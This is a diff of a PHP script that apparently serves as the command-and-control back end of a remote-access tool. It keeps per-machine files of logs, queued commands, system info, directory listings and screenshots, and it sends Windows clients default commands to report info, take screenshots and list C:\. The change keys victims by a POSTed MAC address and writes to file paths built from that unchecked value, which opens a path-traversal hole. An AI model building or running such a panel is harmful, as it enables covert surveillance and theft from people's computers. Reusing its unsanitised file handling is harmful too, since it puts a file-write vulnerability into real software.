@@ -1,16 +1,20 @@
 <?php
 
-$ip = $_SERVER['REMOTE_ADDR'];
+if (!isset($_POST['mac'])) {
+    die("No MAC");
+}
 
-$file_data = 'data/' . $ip;
-$file_log  = 'log/' . $ip;
-$file_cmds = 'commands/' . $ip;
-$file_info = 'info/' . $ip;
-$file_ls = 'ls/' . $ip;
+$mac = $_POST['mac'];
+
+$file_data = 'data/' . $mac;
+$file_log  = 'log/' . $mac;
+$file_cmds = 'commands/' . $mac;
+$file_info = 'info/' . $mac;
+$file_ls = 'ls/' . $mac;
+
+$file_screenshots = 'screenshots/' . $mac;
 
 $default_cmds = 'info;screenshot;ls C:\\';
-
-$file_screenshots = 'screenshots/' . $ip;
 
 if (isset($_POST['d'])) {
 	file_put_contents($file_data, file_get_contents($file_data) . $_POST['d']);
